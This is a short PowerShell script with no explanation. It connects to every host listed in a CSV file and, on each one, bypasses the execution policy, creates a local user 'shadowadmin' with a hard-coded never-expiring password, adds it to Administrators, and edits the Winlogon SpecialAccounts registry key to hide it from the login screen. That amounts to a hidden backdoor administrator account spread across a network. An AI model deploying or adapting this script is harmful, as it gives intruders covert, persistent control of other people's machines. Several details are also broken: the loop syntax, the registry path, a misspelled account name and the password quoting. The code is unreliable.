$hosts = get-content hosts.csv
for each ($int in $hosts){
	invoke-command -computername $int -scriptblock {
		set-executionpolicy bypass ;`
		new-localuser -name shadowadmin -password $(convertto-securestring "p$ssword" -asplaintext -force) -passwordneverexpires ;`
		add-localgroupmember -group administrators -member shadowadmin ;`
		cmd /c 'echo yes | reg add "HKLM\SYSTEM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v shadownadmin /d 0 /t REG_DWORD' ;`
		Write-Output 'success' ;`
		}
		}